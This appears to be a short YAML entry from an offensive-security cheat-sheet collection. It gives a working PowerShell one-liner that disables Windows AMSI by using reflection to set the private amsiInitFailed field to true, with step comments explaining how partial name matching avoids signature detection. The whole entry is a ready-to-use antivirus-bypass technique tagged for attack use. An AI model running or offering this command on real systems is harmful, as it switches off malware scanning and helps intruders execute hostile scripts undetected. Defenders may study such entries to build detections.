---
description: |
  One-liner to bypass the AMSI in a Powershell. Manipulating a result variable set by AmsiInitialize can also lead to another AMSI bypass through the amsiInitFailed field.

  Command Reference:
  ```
  loop the GetTypes method, searching for all types containing the string “iUtils” in its name

  GetFields accepts filtering modifiers, we’ll apply the NonPublic and Static filters to help narrow the results

  loop through all the fields, searching for a name containing “nitFailed”, as this does not be marked as malicious looking for the amsiContext

  set the value to True as this bypasses the AMSI
  ```
command: |
  $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*nitFailed") {$f=$e}};$f.setValue($null,$true)

items:
  - Shell
services:
  - AV
OS:
  - Windows
attack_types:
  - Bypassing
references:
  - https://gist.github.com/D3Ext/bf57673644ba08e729f65892e0dae6c4
---